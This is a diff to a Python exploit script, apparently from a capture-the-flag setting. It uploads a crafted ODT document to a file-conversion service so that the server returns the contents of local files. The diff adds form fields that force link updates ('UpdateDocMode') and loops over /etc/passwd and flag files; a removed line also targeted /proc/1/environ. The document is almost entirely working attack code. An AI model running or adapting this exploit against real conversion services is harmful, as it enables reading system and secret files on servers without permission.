@@ -23,10 +23,15 @@ def payload(target):
     return out.getvalue()
 
 
-def convert(target, fmt="txt"):
+def convert(target, fmt="txt", fields=None):
     data = payload(target)
     boundary = "----Arena" + uuid.uuid4().hex
-    body = (
+    prefix = b""
+    for name, value in (fields or {}).items():
+        prefix += (
+            f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}\r\n"
+        ).encode()
+    body = prefix + (
         f"--{boundary}\r\n"
         'Content-Disposition: form-data; name="data"; filename="probe.odt"\r\n'
         "Content-Type: application/vnd.oasis.opendocument.text\r\n\r\n"
@@ -36,7 +41,7 @@ def convert(target, fmt="txt"):
     req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
     req.add_header("Content-Length", str(len(body)))
     req.add_header("User-Agent", "Mozilla/5.0")
-    print("\n" + "=" * 25, "CONVERT", target, "TO", fmt, "BYTES", len(data), flush=True)
+    print("\n" + "=" * 25, "CONVERT", target, "TO", fmt, "FIELDS", fields, "BYTES", len(data), flush=True)
     try:
         with urllib.request.urlopen(req, timeout=90) as r:
             raw = r.read(500000)
@@ -48,5 +53,7 @@ def convert(target, fmt="txt"):
         print("ERROR", repr(e), flush=True)
 
 
-for path in ("/etc/passwd", "/flag", "/flag.txt", "/proc/1/environ"):
-    convert(path)
+for mode in ("1", "3"):
+    options = {"infilterOptions": "UpdateDocMode=" + mode}
+    for path in ("/etc/passwd", "/flag", "/flag.txt"):
+        convert(path, fields=options)
